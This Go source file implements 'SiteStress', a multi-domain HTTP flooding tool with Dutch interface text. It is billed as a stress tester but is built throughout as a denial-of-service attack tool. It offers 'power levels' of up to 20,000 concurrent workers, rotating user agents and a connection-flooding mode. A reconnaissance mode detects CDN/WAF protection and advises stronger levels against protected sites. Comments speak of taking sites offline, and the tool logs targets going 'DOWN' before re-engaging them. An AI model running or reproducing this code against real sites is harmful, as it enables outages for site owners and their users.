package main

import (
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/miekg/dns"
)

const version = "3.4.0"

func printBanner() {
	fmt.Println("SiteStress (part of Lucas Kit) is made by Lucas Mangroelal | lucasmangroelal.nl")
}

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
}

func getRandomUserAgent() string {
	return userAgents[rand.Intn(len(userAgents))]
}

type options struct {
	domain        string
	measure       bool
	attackMinutes int
	concurrency   int
	level         int
	noKeepAlive   bool
	outputDir     string
	help          bool
	version       bool
}

type domainStats struct {
	domain          string
	targetURL       string
	totalRequests   int64
	successRequests int64
	failedRequests  int64
	siteDown        bool
	siteDownSince   time.Time
	mu              sync.Mutex
	statusLog       []string
}

func main() {
	var o options

	flag.StringVar(&o.domain, "d", "", "Domein(en) om te meten of aan te vallen (comma-separated)")
	flag.BoolVar(&o.measure, "measure", false, "Meet de kracht van de site en krijg advies")
	flag.IntVar(&o.attackMinutes, "t", 0, "Aantal minuten om aan te vallen")
	flag.IntVar(&o.concurrency, "c", 0, "Aantal workers (overschrijft level)")
	flag.IntVar(&o.level, "level", 0, "Power Level (1-10). 1=Soft, 5=Medium, 10=EXTREME")
	flag.BoolVar(&o.noKeepAlive, "no-keepalive", false, "Schakel keep-alive uit (forceer nieuwe connecties)")
	flag.StringVar(&o.outputDir, "o", "", "Map om rapport en logs in op te slaan")
	flag.BoolVar(&o.help, "help", false, "Toon help")
	flag.BoolVar(&o.help, "h", false, "Toon help (kort)")
	flag.BoolVar(&o.version, "version", false, "Toon versie")

	flag.Usage = func() {
		printBanner()
		fmt.Fprintf(os.Stderr, "SiteStress v%s - Advanced HTTP Stress Test Tool\n\n", version)
		fmt.Fprintf(os.Stderr, "Gebruik:\n")
		fmt.Fprintf(os.Stderr, "  1. Meten:\n")
		fmt.Fprintf(os.Stderr, "     sitestress -measure -d <domein>\n\n")
		fmt.Fprintf(os.Stderr, "  2. Aanvallen (Levels):\n")
		fmt.Fprintf(os.Stderr, "     sitestress -d <domein> -t <minuten> -level 5\n")
		fmt.Fprintf(os.Stderr, "     sitestress -d <domein> -t <minuten> -level 10 (EXTREME)\n\n")
		fmt.Fprintf(os.Stderr, "  3. Custom (Advanced):\n")
		fmt.Fprintf(os.Stderr, "     sitestress -d <domein> -t 5 -c 5000 -no-keepalive\n\n")
		fmt.Fprintf(os.Stderr, "Flags:\n")
		flag.PrintDefaults()
	}

	flag.Parse()

	if o.version {
		printBanner()
		fmt.Printf("Version: %s\n", version)
		os.Exit(0)
	}
	if o.help {
		flag.Usage()
		os.Exit(0)
	}

	if o.domain == "" {
		flag.Usage()
		os.Exit(2)
	}

	printBanner()

	// Mode 1: Measurement
	if o.measure {
		runMeasure(o.domain)
		return
	}

	// Mode 2: Attack
	if o.attackMinutes <= 0 {
		fmt.Println("❌ Aantal minuten (-t) is vereist voor een aanval.")
		os.Exit(2)
	}

	fmt.Printf("Version: %s | Platform: %s/%s\n", version, runtime.GOOS, runtime.GOARCH)
	fmt.Println("⚠️  WAARSCHUWING: Gebruik dit alleen op systemen waar je toestemming voor hebt.")
	fmt.Println()

	domains := strings.Split(o.domain, ",")
	for i := range domains {
		domains[i] = normalizeDomain(domains[i])
	}

	// Apply Level Logic if -c is not manually set
	applyLevelSettings(&o)

	if o.outputDir != "" {
		if err := os.MkdirAll(o.outputDir, 0755); err != nil {
			fmt.Printf("Fout bij maken output map: %v\n", err)
			os.Exit(1)
		}
	}

	runAttack(domains, o)
}

// Logic to map Level 1-10 to Concurrency
func applyLevelSettings(o *options) {
	if o.concurrency > 0 {
		return // Manual override wins
	}

	if o.level == 0 {
		o.level = 4 // Default if nothing specified
	}

	if o.level < 1 {
		o.level = 1
	}
	if o.level > 10 {
		o.level = 10
	}

	// Scale
	// 1: 50
	// 5: 1000
	// 8: 5000
	// 10: 20000

	switch o.level {
	case 1:
		o.concurrency = 50
	case 2:
		o.concurrency = 150
	case 3:
		o.concurrency = 300
	case 4:
		o.concurrency = 750
	case 5:
		o.concurrency = 1500
	case 6:
		o.concurrency = 3000
	case 7:
		o.concurrency = 5000
	case 8:
		o.concurrency = 8000
	case 9:
		o.concurrency = 12000
	case 10:
		o.concurrency = 20000
	}

	// Level 9/10 force no-keepalive for flooding if not specified?
	// No, let's keep that manual or suggestive. Flooding keeps sockets busy.
	// Actually for "offline taking", socket exhaustion (keep-alive) is sometimes effective too.
	// Let's stick to concurrency scaling for now.

	fmt.Printf("🎚️  Power Level: %d -> %d Workers\n", o.level, o.concurrency)
}

func normalizeDomain(d string) string {
	d = strings.TrimSpace(d)
	d = strings.TrimPrefix(d, "http://")
	d = strings.TrimPrefix(d, "https://")
	d = strings.TrimSuffix(d, "/")
	return strings.TrimSuffix(d, ".")
}

func runMeasure(domain string) {
	domain = normalizeDomain(domain)
	fmt.Printf("🔍 Measuring target: %s\n", domain)

	// 1. Resolve
	ips, err := net.LookupHost(domain)
	if err != nil {
		fmt.Printf("❌ Could not resolve domain: %v\n", err)
		return
	}
	fmt.Printf("📍 IP Addresses: %v\n", ips)

	// 2. HTTP Probe
	client := &http.Client{
		Timeout: 5 * time.Second,
	}

	start := time.Now()
	resp, err := client.Get("https://" + domain)
	if err != nil {
		// Try HTTP
		resp, err = client.Get("http://" + domain)
	}

	if err != nil {
		fmt.Printf("❌ Could not connect (HTTPS or HTTP): %v\n", err)
		return
	}
	defer resp.Body.Close()

	duration := time.Since(start)
	server := resp.Header.Get("Server")
	poweredBy := resp.Header.Get("X-Powered-By")

	fmt.Printf("⏱️  Latency: %v\n", duration)
	fmt.Printf("🏢 Server Header: %s\n", server)
	if poweredBy != "" {
		fmt.Printf("⚡ X-Powered-By: %s\n", poweredBy)
	}

	// Analysis
	score := 0
	isProtected := false

	lowerServer := strings.ToLower(server)
	if strings.Contains(lowerServer, "cloudflare") || strings.Contains(lowerServer, "akamai") || strings.Contains(lowerServer, "fastly") {
		isProtected = true
		score += 5
		fmt.Println("🛡️  Protection Detected (CDN/WAF)")
	} else if strings.Contains(lowerServer, "nginx") || strings.Contains(lowerServer, "apache") {
		score += 2
	}

	if duration < 100*time.Millisecond {
		score += 3 // Very fast infrastructure
	} else if duration > 1*time.Second {
		score -= 1 // Slow site
	}

	fmt.Println("\n📊 ANALYSIS RESULT:")

	recLevel := 5
	if isProtected {
		fmt.Println("   Type: PROTECTED / LARGE")
		fmt.Println("   Advice: This target uses a CDN/WAF. Simple flooding might be blocked.")
		fmt.Println("   Recommendation: Use Level 8-10 + Random checks.")
		recLevel = 9
	} else if score >= 4 {
		fmt.Println("   Type: MEDIUM / FAST")
		fmt.Println("   Advice: Good infrastructure. Needs substantial load.")
		fmt.Println("   Recommendation: Use Level 6-8.")
		recLevel = 7
	} else {
		fmt.Println("   Type: SMALL / SLOW")
		fmt.Println("   Advice: Likely a single server or VPS. Easy to stress.")
		fmt.Println("   Recommendation: Use Level 3-5. (Don't kill it instantly!)")
		recLevel = 4
	}

	fmt.Printf("\n🚀 SUGGESTED COMMAND:\n")
	fmt.Printf("   sitestress -d %s -t 5 -level %d\n", domain, recLevel)
}

func runAttack(domains []string, o options) {
	duration := time.Duration(o.attackMinutes) * time.Minute
	deadline := time.Now().Add(duration)

	workersPerDomain := o.concurrency

	// Sterk getunede HTTP client
	transport := &http.Transport{
		MaxIdleConns:        workersPerDomain * len(domains),
		MaxIdleConnsPerHost: workersPerDomain,
		IdleConnTimeout:     90 * time.Second,
		DisableKeepAlives:   o.noKeepAlive,
		ForceAttemptHTTP2:   true,
	}

	httpClient := &http.Client{
		Timeout:   5 * time.Second,
		Transport: transport,
	}

	// Setup DNS resolver (8.8.8.8 default)
	dnsClient := &dns.Client{Timeout: 2 * time.Second}
	resolver := "8.8.8.8:53"

	allStats := make([]*domainStats, len(domains))

	// Initial checks
	for i, domain := range domains {
		fmt.Printf("🔍 Initiele check voor %s...\n", domain)

		// DNS lookup
		var targetIPs []string
		m := new(dns.Msg)
		m.SetQuestion(dns.Fqdn(domain), dns.TypeA)
		in, _, err := dnsClient.Exchange(m, resolver)
		if err == nil && len(in.Answer) > 0 {
			for _, ans := range in.Answer {
				if a, ok := ans.(*dns.A); ok {
					targetIPs = append(targetIPs, a.A.String())
				}
			}
		}

		if len(targetIPs) == 0 {
			// Fallback: system lookup
			ips, _ := net.LookupHost(domain)
			if len(ips) > 0 {
				targetIPs = ips
			} else {
				fmt.Printf("⚠️  Geen IP adressen gevonden voor %s, we proberen het toch.\n", domain)
			}
		} else {
			fmt.Printf("📍 IPs: %s\n", strings.Join(targetIPs, ", "))
		}

		// URL bepalen
		urls := []string{"https://" + domain, "http://" + domain}
		var targetURL string
		for _, u := range urls {
			req, _ := http.NewRequest("GET", u, nil)
			req.Header.Set("User-Agent", getRandomUserAgent())
			resp, err := httpClient.Do(req)
			if err == nil {
				targetURL = u
				resp.Body.Close()
				break
			}
		}
		if targetURL == "" {
			targetURL = urls[0] // Fallback
		}

		allStats[i] = &domainStats{
			domain:    domain,
			targetURL: targetURL,
		}
		fmt.Printf("🎯 Target: %s\n", targetURL)
	}

	fmt.Printf("\n🚀 Starten aanval (%d workers per domein)...\n", workersPerDomain)
	if o.noKeepAlive {
		fmt.Println("🔥 Mode: No-KeepAlive (Connection flooding)")
	} else {
		fmt.Println("🌊 Mode: Keep-Alive (High throughput)")
	}
	fmt.Printf("⏱️  Totale tijd: %d minuten\n", o.attackMinutes)

	var globalWg sync.WaitGroup

	for _, stats := range allStats {
		if stats == nil {
			continue
		}
		s := stats
		for w := 0; w < workersPerDomain; w++ {
			globalWg.Add(1)
			go func() {
				defer globalWg.Done()

				for time.Now().Before(deadline) {
					req, _ := http.NewRequest("GET", s.targetURL, nil)
					req.Header.Set("User-Agent", getRandomUserAgent())
					req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")

					// Randomize connection header if keep alive is on, occasionally close to refresh?
					// For now rely on transport settings.

					resp, err := httpClient.Do(req)

					s.mu.Lock()
					isDown := s.siteDown
					s.mu.Unlock()

					if err != nil {
						// Connection error
						if !isDown {
							s.mu.Lock()
							if !s.siteDown {
								s.siteDown = true
								s.siteDownSince = time.Now()
								msg := fmt.Sprintf("[%s] 💥 %s is DOWN (connection error)!", time.Now().Format(time.TimeOnly), s.domain)
								s.statusLog = append(s.statusLog, msg)
								fmt.Println("\n" + msg)
							}
							s.mu.Unlock()
						}
						atomic.AddInt64(&s.failedRequests, 1)
					} else {
						io.Copy(io.Discard, resp.Body)
						resp.Body.Close()

						if resp.StatusCode >= 500 || resp.StatusCode == 429 {
							if !isDown {
								s.mu.Lock()
								if !s.siteDown {
									s.siteDown = true
									s.siteDownSince = time.Now()
									msg := fmt.Sprintf("[%s] 💥 %s is DOWN (status %d)!", time.Now().Format(time.TimeOnly), s.domain, resp.StatusCode)
									s.statusLog = append(s.statusLog, msg)
									fmt.Println("\n" + msg)
								}
								s.mu.Unlock()
							}
							atomic.AddInt64(&s.failedRequests, 1)
						} else {
							// Site is UP
							if isDown {
								s.mu.Lock()
								if s.siteDown {
									downTime := time.Since(s.siteDownSince).Round(time.Second)
									s.siteDown = false
									msg := fmt.Sprintf("[%s] ✅ %s is weer ONLINE (was %v plat). Re-engaging...", time.Now().Format(time.TimeOnly), s.domain, downTime)
									s.statusLog = append(s.statusLog, msg)
									fmt.Println("\n" + msg)
								}
								s.mu.Unlock()
							}
							atomic.AddInt64(&s.successRequests, 1)
						}
					}
					atomic.AddInt64(&s.totalRequests, 1)
				}
			}()
		}
	}

	// Monitor loop
	ticker := time.NewTicker(2 * time.Second) // Sneller updaten voor leuk effect
	defer ticker.Stop()

	// Hier wachten we tot tijd voorbij is OF interrupt
	startTime := time.Now()
loop:
	for {
		select {
		case <-ticker.C:
			remaining := time.Until(deadline).Round(time.Second)
			if remaining <= 0 {
				break loop
			}
			elapsed := time.Since(startTime).Seconds()

			var totalReqs int64
			for _, s := range allStats {
				if s != nil {
					totalReqs += atomic.LoadInt64(&s.totalRequests)
				}
			}
			rps := float64(totalReqs) / elapsed

			fmt.Printf("\r⏳ Nog: %v | RPS: %.0f | ", remaining, rps)
			for i, s := range allStats {
				if s == nil {
					continue
				}
				if i > 0 {
					fmt.Print(" | ")
				}

				s.mu.Lock()
				status := "🟢"
				if s.siteDown {
					status = "🔴"
				}
				s.mu.Unlock()

				fmt.Printf("%s: %s (%d fail)", s.domain, status, atomic.LoadInt64(&s.failedRequests))
			}
		}
		if time.Now().After(deadline) {
			break
		}
	}

	fmt.Println("\n\n🛑 Tijd is om. Wachten op workers (kan even duren)...")
	globalWg.Wait()

	// Rapport genereren
	generateReport(allStats, o.outputDir, o.attackMinutes)
}

func generateReport(stats []*domainStats, outputDir string, minutes int) {
	fmt.Println("\n📊 EINDRESULTATEN")

	reportLines := []string{}
	reportLines = append(reportLines, fmt.Sprintf("SITESTRESS RAPPORT - %s", time.Now().Format(time.RFC1123)))
	reportLines = append(reportLines, fmt.Sprintf("Duur test: %d minuten", minutes))
	reportLines = append(reportLines, strings.Repeat("-", 50))

	for _, s := range stats {
		if s == nil {
			continue
		}

		total := atomic.LoadInt64(&s.totalRequests)
		success := atomic.LoadInt64(&s.successRequests)
		fail := atomic.LoadInt64(&s.failedRequests)

		summary := fmt.Sprintf("\nDOMEIN: %s", s.domain)
		fmt.Println(summary)
		reportLines = append(reportLines, summary)

		line1 := fmt.Sprintf("   Requests Totaal: %d", total)
		line2 := fmt.Sprintf("   Geslaagd (Up):   %d", success)
		line3 := fmt.Sprintf("   Gefaald (Down):  %d", fail)

		fmt.Println(line1)
		fmt.Println(line2)
		fmt.Println(line3)

		reportLines = append(reportLines, line1, line2, line3)
		reportLines = append(reportLines, "   Logboek:")

		s.mu.Lock()
		if len(s.statusLog) == 0 {
			msg := "   (Geen downtime events geregistreerd)"
			fmt.Println(msg)
			reportLines = append(reportLines, msg)
		} else {
			for _, log := range s.statusLog {
				fmt.Printf("   %s\n", log)
				reportLines = append(reportLines, "   "+log)
			}
		}
		s.mu.Unlock()
	}

	if outputDir != "" {
		fPath := filepath.Join(outputDir, fmt.Sprintf("report_%d.txt", time.Now().Unix()))
		f, err := os.Create(fPath)
		if err != nil {
			fmt.Printf("\n⚠️  Kon rapport niet opslaan: %v\n", err)
			return
		}
		defer f.Close()

		for _, line := range reportLines {
			f.WriteString(line + "\n")
		}
		fmt.Printf("\n💾 Rapport opgeslagen in: %s\n", fPath)
	}
}
